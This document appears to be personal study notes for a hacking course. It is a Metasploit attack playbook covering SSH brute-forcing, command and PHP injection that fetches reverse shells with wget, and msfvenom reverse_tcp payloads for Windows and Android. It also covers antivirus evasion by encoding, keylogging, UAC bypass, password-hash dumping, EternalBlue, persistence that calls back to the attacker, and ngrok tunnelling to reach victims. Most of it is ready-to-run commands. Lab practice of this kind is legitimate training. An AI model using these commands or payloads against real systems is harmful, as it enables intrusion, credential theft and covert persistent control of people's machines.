# System Hacking

## Tables des matière
 - [MSFconsole environment](#MSFconsole-environment)
 - [Metasploit framwork](#Metasploit-framwork)
 - [Bruteforcing SSH with Metasploit](#Bruteforcing-SSH-with-Metasploit)
 - [Attacking Tomcat with Metasploit](#Attacking-Tomcat-with-Metasploit)
 - [Getting Meterpreter with command injection](#Getting-Meterpreter-with-command-injection)
 - [PHP code injection](#PHP-code-injection)
 - [Metasploitable exploit](#Metasploitable-exploit)
 - [Wine](#Wine)
 - [Creating Windows payloads with Msfvenom](#Creating-Windows-payloads-with-Msfvenom)
 - [Encoders and hexeditor](#Encoders-and-hexeditor)
 - [Interesting commands on windows](#Interesting-commands-on-windows)
 - [Windows 10 privilege escalation](#Windows-10-privilege-escalation)
 - [Post exploiting module](#Post-exploiting-module)
 - [Eternalblue exploit](#Eternalblue-exploit)
 - [Persistence module](#Persistence-module)
 - [Ngrok](#Ngrok)
 - [Android device attack](#Android-device-attack)

### MSFconsole environment

`service postgresql start` to run your metasploit framwork faster using sql databases.

Start Msfconsole --> `msfconsole`
	
You can run every linux commands in the msfconsole terminal
	
Search command to see available exploit --> for example `search windows`

Use command to go to this exploit  --> for example `use <exploit_path>`

Show command --> `show info`, `show options`, `show targets`, `show payload` 

In order to use some of the payload available for this exploit --> `set PAYLOAD <payload_path>`. You can see payload options --> `show options`. You can set the options for this payload --> `set <option_name> <value>` --> For example `set LHOST 192.168.1.246`
			   

### Metasploit framwork 

In `/usr/share/metasploit-framework/` :

	msfconsole --> run the msfconsole
	
	msfvenom   --> create payloads and backdoors
	
	msfupdate  --> update metasploit framework
	
	auxilary/  --> for scanning
	
	encoders/  --> for bypass antivirus, antiviruses have got a huge database of known exploits and viruses, if you run a program which is a known virus, the antivirus can alert an delete it. But if you change or scramble a litle bit the code, you can bypass them because the code is not in their database.
	
	post/      --> tools or programs you can use after infecting the target. You can download them with a reverse shell and do some informations gathering.
	
	nops/      --> command in assembly language and it's perform no operation.	
	
Every exploits, payloads... are stored in `/usr/share/metasploit-framework/modules`

In payloads directory :

	singles --> payload that perform only one action
	
	stagers --> use to deliver an another payload
	
	stages  --> larger payload which allows you to make some meterpreter shell (reverse shell), NVC...	

### Bruteforcing SSH with Metasploit

With nmap command, we find that the victim has his ssh port open. (22)

Search an auxiliary module in msf `search ssh`, for bruteforcing ssh login let's go to auxiliary/scanner/ssh/ssh_login module (before you can see the version of ssh with ssh_version module)

Set your options you want (`RHOSTS, THREAD, STOP_ON_SUCCESS, PASSWD_LIST, USERS_LIST...`)

And type the command `run` or `exploit`

### Attacking Tomcat with Metasploit
	 
With nmap command, we find that the victim has his tomcat port open. (8080)

We use `auxiliary/scanner/http/tomcat_mgr_login module`

### Getting Meterpreter with command injection

Type `msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip_of_the_listener(me)> LPORT=<ip_of_the_listening_port(For metasploit it's 4444)> -e <encrypting_algorithm> -f raw > <file_you_want_to write>`
	
Add the php beacons to the file.
	
Move this file to your main apache2 server as the main page.
	
Make the server download your file with a `wget` command.
	
Start listening on the port you specify in the command before go to metasploit framework : 
		
`msfconsole` --> `use exploit/multi/handler` --> `set payload <ayload_you_created_befored(php/meterpreter/reverse_tcp?>` --> `set LHOST <ip_listening_host>` --> `exploit`
		
To make the process running in background, type `exploit -j -z` --> to enter to a session type `sessions -i <process_id>`

To send your session in the background type `background`

With the command injection vulnerability, run `php -f <file_you_created>` on the victim input. You see that you receive some packets on your terminal which runs the last command.

### PHP code injection

To see if a web site is vulnerable to php code injection, use the system function with some basics linux commands in the input --> `system('pwd')`

If it's work, you can perform a `wget` in order to download your reverse_shell and execute it on the victim server.

### Metasploitable exploit 

The OWASP machine has its netbios-ssn (139 tcp) port open running on samba 3X - 4X : 

Search on the msfconsole something linked with it --> `search samba`

Show the payloads available for this exploit. We take the `cmd/unix/reverse`. Specify the required options for this payload (RHOST in this case). Run the exploit, on the OWASP it's doesn't work but on the metsploitable machine it's should work. 

### Wine

Linux programs which allows you to run Winodws program on your Linux machine. Make python programs in Linux and make them runable in Linux. After the instalation of python 2.7.14 with wine `wine msiexec /i <file_python_2.7.14.msi>`, wine created a virtual C:/ drive in each directory --> go to `.wine/drive_c/`. If you want run a .exe in Linux, you must type `wine` before the program name.

### Creating Windows payloads with Msfvenom 

Search a interesting payload --> `search payload/windows` --> you can use the x64 or x32, it depends of the victim machine --> remember the name of the payload you want, in this case `payload/windows/x64/meterpreter/reverse_tcp`

Create your payload --> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<listener_ip_adress(you?)> LPORT=4444 -f exe > reverse.exe`


### Encoders and hexeditor

**VirusTotal** : web site that allows us to upload a file and it will print out a list of how antiviruses detect this file as a virus. (be careful, this site sends each file to antiviruses databases)

In order to make your payloads less detectable by AV, you need to encode your payload.

Search what encoders are available with your payload and add the parameter `-e` to your command.

You can iterate a number of time your payload. Add `-i` parameter.

With **Hexeditor**, you can change bytes when you have comments, phrases in the payload code.

### Interesting commands on windows 

	getsystem --> privileges escalation for old versions of windows
	keyscan_start --> record all of the char when the victim is typing something. 
	keyscan_dump --> view all of the information that keylogger have after making him started. 
	keyscan_stop --> stop the keylogger

### Windows 10 privilege escalation

Make your process in the background and type `search bypassuac`. (The bypassuac_fodhelper is the stronger from now on)
	
Use the exploit you want, and set the session id of your meterpreter and `exploit` (sometimes it's created the session sometimes not, try until you get a sesion open)

In order to get the privilege type `getsystem`
	
### Post exploiting module

When you have the local system account :
		
		--> use sniffer (some options will work and some not for this module) (sniff the networks of interfaces)
			alternativ --> run packetrecorder 
		--> use post/windows/gather/arp_scanner --> ARP scan
		--> run post/windows/gather/checkvm --> check if the program is running on a vm or a pm.
		--> run post/windows/gather/hasdump --> get the password hash of each user
			alternativ --> run post/windows/gather/credentials/crediental_collector
		--> run post/windows/gather/enum_application --> enum all of the installed application with versions
		--> run post/windows/gather/enum_logged_on_users

### Eternalblue exploit

`git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git`
	
copy debs/ and *.rb in the directory `/usr/share/metasploit-framework/modules/exploits/windows/smb`

Start msf console and use the exploit, as root. Change some options if it's required (PROCESSINJECT lsass.exe for x64).

`Set payload windows/x64/meterpreter/reverse_tcp` --> `set LHOST <listener_ip(you?)` --> `exploit`

The eternalblue exploit allows us to hack the target without any action of this one.

### Persistence module

	run persistence -U --> start the program when user log on.	
	run persistence -X --> start the program when he system boots.
	run persistence (-U) -i <seconds> --> interval of connecting tries
	
	--> run persistence (-X -i <seconds>) -p <port(443?)> -r <remote_ip(your_ip_adress?)>

### Ngrok

Download Ngrok on their website and create an account to have the token.

A port forwarding alternativ when you don't have access to the router (open wifi for example).
	
The Ngrok web site allows you to have an open port on thier website and redirect the trafic to you when someone connects to this open port.

If you want to redirect the trafic to a specific port with tcp --> `./ngrok tcp <port>`
	
When you create payload, make sure that you LHOST is the ip adress ngrok gives to you as same as the port number for LPORT.

In msfconsole, on your `multi/handler`, make sure that the LHOST of the payload is `0.0.0.0` and the LPORT is the same when you have ran the command `./ngrok...`

### Android device attack

	msfvenom -p android/meterpreter/reverse_tcp LHOST=<listener_ip(you?)> LPORT=<listener_port(4444?)> R > <path_to_the_file>.apk
	
Go to multi/handler on msfconsole, set the same payload and the corret options.

